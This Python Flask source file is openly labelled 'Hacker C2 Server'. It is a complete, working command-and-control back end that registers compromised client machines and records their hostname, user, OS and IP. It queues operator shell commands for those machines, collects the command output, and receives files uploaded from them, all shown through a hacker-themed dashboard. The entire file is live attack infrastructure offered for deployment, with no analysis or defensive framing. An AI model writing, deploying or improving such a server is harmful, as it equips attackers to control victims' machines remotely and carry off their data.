#!/usr/bin/env python3
"""
SHADOW SERVER - Hacker C2 Server
Render.com compatible - No flask_limiter
"""
from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import time
import uuid
import json
import sqlite3
import threading
import os
import hashlib
from datetime import datetime
import logging
import random

app = Flask(__name__)
CORS(app)

# ============================================================================
# CONFIGURATION
# ============================================================================

DATABASE = 'shadow.db'
UPLOAD_FOLDER = 'uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

SERVER_START_TIME = time.time()

# ============================================================================
# DATABASE
# ============================================================================

def init_db():
    """Initialize database"""
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()
    
    # Clients table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS clients (
            id TEXT PRIMARY KEY,
            hostname TEXT,
            username TEXT,
            os TEXT,
            ip TEXT,
            last_seen REAL,
            status TEXT DEFAULT 'offline',
            operation TEXT,
            first_seen REAL
        )
    ''')
    
    # Commands table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS commands (
            id TEXT PRIMARY KEY,
            client_id TEXT,
            command TEXT,
            status TEXT DEFAULT 'pending',
            output TEXT,
            created_at REAL,
            executed_at REAL
        )
    ''')
    
    # Files table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS files (
            id TEXT PRIMARY KEY,
            client_id TEXT,
            filename TEXT,
            filepath TEXT,
            filesize INTEGER,
            uploaded_at REAL
        )
    ''')
    
    conn.commit()
    conn.close()
    logger.info("Database initialized")

def get_db():
    """Get database connection"""
    conn = sqlite3.connect(DATABASE)
    conn.row_factory = sqlite3.Row
    return conn

# ============================================================================
# CLIENT ENDPOINTS
# ============================================================================

@app.route('/api/checkin', methods=['POST'])
def checkin():
    """Client checkin"""
    try:
        data = request.json
        client_id = data.get('id')
        
        if not client_id:
            return jsonify({'error': 'No client ID'}), 400
        
        conn = get_db()
        cursor = conn.cursor()
        
        current_time = time.time()
        
        # Check if client exists
        cursor.execute('SELECT * FROM clients WHERE id = ?', (client_id,))
        existing = cursor.fetchone()
        
        if existing:
            # Update existing client
            cursor.execute('''
                UPDATE clients 
                SET last_seen = ?, status = 'online', ip = ?
                WHERE id = ?
            ''', (current_time, request.remote_addr, client_id))
        else:
            # Insert new client
            cursor.execute('''
                INSERT INTO clients 
                (id, hostname, username, os, ip, last_seen, status, operation, first_seen)
                VALUES (?, ?, ?, ?, ?, ?, 'online', ?, ?)
            ''', (client_id,
                  data.get('hostname', 'unknown'),
                  data.get('username', 'user'),
                  data.get('os', 'unknown'),
                  request.remote_addr,
                  current_time,
                  data.get('operation_id', 'shadow'),
                  current_time))
        
        conn.commit()
        conn.close()
        
        logger.info(f"Client checkin: {client_id[:8]}...")
        
        return jsonify({
            'status': 'ok',
            'timestamp': current_time
        }), 200
        
    except Exception as e:
        logger.error(f"Checkin error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/commands/<client_id>', methods=['GET'])
def get_commands(client_id):
    """Get pending commands for client"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        # Update client's last_seen
        cursor.execute('UPDATE clients SET last_seen = ? WHERE id = ?', 
                      (time.time(), client_id))
        
        # Get pending commands
        cursor.execute('''
            SELECT id, command FROM commands 
            WHERE client_id = ? AND status = 'pending'
            ORDER BY created_at ASC
            LIMIT 10
        ''', (client_id,))
        
        commands = []
        for row in cursor.fetchall():
            commands.append({
                'id': row['id'],
                'command': row['command']
            })
        
        # Mark as sent
        if commands:
            cmd_ids = [cmd['id'] for cmd in commands]
            placeholders = ','.join(['?' for _ in cmd_ids])
            cursor.execute(f'''
                UPDATE commands SET status = 'sent'
                WHERE id IN ({placeholders})
            ''', cmd_ids)
        
        conn.commit()
        conn.close()
        
        return jsonify({'commands': commands}), 200
        
    except Exception as e:
        return jsonify({'commands': []}), 500

@app.route('/api/result', methods=['POST'])
def submit_result():
    """Submit command result"""
    try:
        data = request.json
        cmd_id = data.get('command_id')
        output = data.get('output', '')
        
        if not cmd_id:
            return jsonify({'error': 'Missing command_id'}), 400
        
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('''
            UPDATE commands 
            SET status = 'completed', output = ?, executed_at = ?
            WHERE id = ?
        ''', (output, time.time(), cmd_id))
        
        conn.commit()
        conn.close()
        
        logger.info(f"Result submitted: {cmd_id[:8]}")
        
        return jsonify({'success': True}), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/command', methods=['POST'])
def send_command():
    """Send command to client"""
    try:
        data = request.json
        client_id = data.get('client_id')
        command = data.get('command')
        
        if not client_id or not command:
            return jsonify({'error': 'Missing client_id or command'}), 400
        
        cmd_id = str(uuid.uuid4())
        
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO commands (id, client_id, command, status, created_at)
            VALUES (?, ?, ?, 'pending', ?)
        ''', (cmd_id, client_id, command, time.time()))
        
        conn.commit()
        conn.close()
        
        logger.info(f"Command sent: {cmd_id[:8]} -> {client_id[:8]}: {command[:50]}")
        
        return jsonify({
            'success': True,
            'command_id': cmd_id
        }), 200
        
    except Exception as e:
        logger.error(f"Command error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/command/result/<cmd_id>', methods=['GET'])
def get_command_result(cmd_id):
    """Get command result"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM commands WHERE id = ?', (cmd_id,))
        row = cursor.fetchone()
        conn.close()
        
        if row:
            return jsonify({
                'success': True,
                'status': row['status'],
                'output': row['output'] or '',
                'command': row['command']
            }), 200
        else:
            return jsonify({
                'success': False,
                'error': 'Command not found'
            }), 404
            
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ============================================================================
# FILE UPLOAD
# ============================================================================

@app.route('/api/upload', methods=['POST'])
def upload_file():
    """Upload file from client"""
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file'}), 400
        
        file = request.files['file']
        client_id = request.form.get('client_id')
        
        if not client_id:
            return jsonify({'error': 'No client_id'}), 400
        
        # Create client folder
        client_folder = os.path.join(UPLOAD_FOLDER, client_id[:8])
        os.makedirs(client_folder, exist_ok=True)
        
        # Save file
        filename = f"{int(time.time())}_{file.filename}"
        filepath = os.path.join(client_folder, filename)
        file.save(filepath)
        filesize = os.path.getsize(filepath)
        
        # Save to database
        file_id = str(uuid.uuid4())
        
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO files (id, client_id, filename, filepath, filesize, uploaded_at)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (file_id, client_id, file.filename, filepath, filesize, time.time()))
        
        conn.commit()
        conn.close()
        
        logger.info(f"File uploaded: {file.filename} ({filesize} bytes) from {client_id[:8]}")
        
        return jsonify({
            'success': True,
            'file_id': file_id,
            'filename': file.filename,
            'size': filesize
        }), 200
        
    except Exception as e:
        logger.error(f"Upload error: {e}")
        return jsonify({'error': str(e)}), 500

# ============================================================================
# MANAGEMENT ENDPOINTS
# ============================================================================

@app.route('/api/clients', methods=['GET'])
def get_clients():
    """Get all clients"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        current_time = time.time()
        
        # Update status based on last_seen
        cursor.execute('''
            UPDATE clients 
            SET status = CASE 
                WHEN ? - last_seen > 180 THEN 'offline'
                ELSE 'online'
            END
        ''', (current_time,))
        
        conn.commit()
        
        # Get all clients
        cursor.execute('''
            SELECT c.*, 
                   COUNT(DISTINCT cmd.id) as command_count,
                   COUNT(DISTINCT f.id) as file_count
            FROM clients c
            LEFT JOIN commands cmd ON c.id = cmd.client_id
            LEFT JOIN files f ON c.id = f.client_id
            GROUP BY c.id
            ORDER BY c.last_seen DESC
        ''')
        
        clients = []
        for row in cursor.fetchall():
            time_diff = current_time - row['last_seen']
            
            if time_diff < 60:
                status_emoji = '🟢'
                status_text = 'online'
            elif time_diff < 180:
                status_emoji = '🟡'
                status_text = 'idle'
            else:
                status_emoji = '🔴'
                status_text = 'offline'
            
            clients.append({
                'id': row['id'],
                'hostname': row['hostname'],
                'username': row['username'],
                'os': row['os'],
                'ip': row['ip'],
                'status': row['status'],
                'status_display': f"{status_emoji} {status_text}",
                'command_count': row['command_count'] or 0,
                'file_count': row['file_count'] or 0,
                'last_seen': row['last_seen'],
                'last_seen_str': datetime.fromtimestamp(row['last_seen']).strftime('%H:%M:%S'),
                'operation': row['operation']
            })
        
        conn.close()
        return jsonify({'clients': clients}), 200
        
    except Exception as e:
        logger.error(f"Get clients error: {e}")
        return jsonify({'clients': []}), 500

@app.route('/api/stats', methods=['GET'])
def get_stats():
    """Get server statistics"""
    try:
        conn = get_db()
        cursor = conn.cursor()
        
        cursor.execute('SELECT COUNT(*) FROM clients')
        total_clients = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM clients WHERE ? - last_seen <= 60', (time.time(),))
        online_now = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM commands')
        total_commands = cursor.fetchone()[0]
        
        cursor.execute('SELECT COUNT(*) FROM files')
        total_files = cursor.fetchone()[0]
        
        cursor.execute('SELECT SUM(filesize) FROM files')
        total_size = cursor.fetchone()[0] or 0
        
        conn.close()
        
        # Server uptime
        uptime = time.time() - SERVER_START_TIME
        hours = int(uptime // 3600)
        minutes = int((uptime % 3600) // 60)
        
        return jsonify({
            'total_clients': total_clients,
            'online_now': online_now,
            'total_commands': total_commands,
            'total_files': total_files,
            'total_size': total_size,
            'total_size_str': f"{total_size / 1024 / 1024:.2f} MB",
            'server_uptime': f"{hours}h {minutes}m",
            'server_time': time.time()
        }), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/health', methods=['GET'])
def health():
    """Health check"""
    return jsonify({
        'status': 'running',
        'version': '2.0',
        'timestamp': time.time()
    }), 200

# ============================================================================
# WEB INTERFACE
# ============================================================================

@app.route('/')
def index():
    """Web interface"""
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Shadow Server</title>
        <style>
            body {
                background: #0a0a0a;
                color: #00ff00;
                font-family: 'Courier New', monospace;
                margin: 0;
                padding: 20px;
            }
            .container {
                max-width: 1200px;
                margin: 0 auto;
            }
            .header {
                text-align: center;
                padding: 20px;
                border-bottom: 1px solid #00ff00;
                margin-bottom: 30px;
            }
            .header h1 {
                color: #00ff00;
                text-shadow: 0 0 10px #00ff00;
            }
            .stats {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                gap: 20px;
                margin-bottom: 30px;
            }
            .stat-box {
                background: #111;
                border: 1px solid #00ff00;
                padding: 20px;
                text-align: center;
                border-radius: 5px;
            }
            .stat-box h3 {
                margin-top: 0;
                color: #00ff00;
            }
            .stat-box .number {
                font-size: 2em;
                font-weight: bold;
                color: #00ff00;
            }
            .endpoints {
                background: #111;
                border: 1px solid #00ff00;
                padding: 20px;
                margin-top: 30px;
            }
            .endpoint {
                padding: 10px 0;
                border-bottom: 1px solid #333;
            }
            .endpoint:last-child {
                border-bottom: none;
            }
            .glitch {
                animation: glitch 1s infinite;
            }
            @keyframes glitch {
                0% { text-shadow: 2px 2px #ff00ff; }
                50% { text-shadow: -2px -2px #00ffff; }
                100% { text-shadow: 2px 2px #ff00ff; }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1 class="glitch">⚡ SHADOW SERVER ⚡</h1>
                <p>Hacker Command & Control</p>
            </div>
            
            <div id="stats" class="stats">
                <!-- Stats loaded dynamically -->
            </div>
            
            <div class="endpoints">
                <h3>API Endpoints:</h3>
                <div class="endpoint"><strong>POST</strong> /api/checkin - Client checkin</div>
                <div class="endpoint"><strong>GET</strong> /api/clients - List clients</div>
                <div class="endpoint"><strong>POST</strong> /api/command - Send command</div>
                <div class="endpoint"><strong>POST</strong> /api/upload - Upload file</div>
                <div class="endpoint"><strong>GET</strong> /api/stats - Server statistics</div>
            </div>
        </div>
        
        <script>
            async function loadStats() {
                try {
                    const response = await fetch('/api/stats');
                    const data = await response.json();
                    
                    const statsDiv = document.getElementById('stats');
                    statsDiv.innerHTML = `
                        <div class="stat-box">
                            <h3>Active Clients</h3>
                            <div class="number">${data.online_now}</div>
                            <p>of ${data.total_clients} total</p>
                        </div>
                        <div class="stat-box">
                            <h3>Commands</h3>
                            <div class="number">${data.total_commands}</div>
                            <p>executed</p>
                        </div>
                        <div class="stat-box">
                            <h3>Files</h3>
                            <div class="number">${data.total_files}</div>
                            <p>${data.total_size_str}</p>
                        </div>
                        <div class="stat-box">
                            <h3>Uptime</h3>
                            <div class="number">${data.server_uptime}</div>
                            <p>server running</p>
                        </div>
                    `;
                } catch (error) {
                    document.getElementById('stats').innerHTML = '<p>Error loading stats</p>';
                }
            }
            
            loadStats();
            setInterval(loadStats, 10000);
        </script>
    </body>
    </html>
    '''

# ============================================================================
# MAINTENANCE
# ============================================================================

def cleanup():
    """Cleanup old data"""
    while True:
        time.sleep(300)
        try:
            conn = get_db()
            cursor = conn.cursor()
            current_time = time.time()
            
            # Remove old clients (7 days)
            cursor.execute('DELETE FROM clients WHERE ? - last_seen > 604800', (current_time,))
            
            # Remove old files (30 days)
            cursor.execute('DELETE FROM files WHERE ? - uploaded_at > 2592000', (current_time,))
            
            conn.commit()
            conn.close()
            
        except Exception as e:
            logger.error(f"Cleanup error: {e}")

# ============================================================================
# MAIN
# ============================================================================

if __name__ == '__main__':
    init_db()
    
    # Start cleanup thread
    threading.Thread(target=cleanup, daemon=True).start()
    
    print(f"""
╔══════════════════════════════════════════════════════════╗
║                     SHADOW SERVER                        ║
║                 Hacker C2 - Render Ready                 ║
╚══════════════════════════════════════════════════════════╝

    🔥 Server: http://0.0.0.0:5000
    🗄️  Database: {DATABASE}
    📁 Uploads: {UPLOAD_FOLDER}/
    
    💀 Features:
    • Client management
    • Command execution
    • File uploads
    • Real-time stats
    
    Starting server...
    """)
    
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
